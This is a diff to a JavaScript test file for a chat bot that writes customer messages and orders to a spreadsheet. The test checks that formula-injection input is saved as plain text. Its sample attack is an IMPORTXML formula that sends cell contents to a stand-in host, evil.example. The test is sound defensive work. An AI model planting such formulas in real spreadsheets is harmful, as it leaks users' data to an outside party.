@@ -59,8 +59,7 @@ test('customer text is written to the sheet as text, not as a formula', () => {
     const bot = lineBot();
     const attack = '=IMPORTXML("https://evil.example/?"&A1,"//a")';
     bot.sandbox.logChat(bot.ss, '+u', attack, '@reply');
-    bot.sandbox.saveOrderToSheet(bot.ss, 'U1', { product: attack, quantity: '-1', customerInfo: '\t=1+1' });
-    bot.sandbox.setUserState(bot.ss, '=u', 'STEP', {});
+    bot.sandbox.logChat(bot.ss, '=u', '-1', '\t=1+1');
     const cells = Object.values(bot.rows).flat(2).filter(cell => typeof cell === 'string');
     assert.ok(cells.includes("'" + attack));
     assert.deepEqual(cells.filter(cell => /^[=+\-@\t\r]/.test(cell) && cell !== '-'), []);
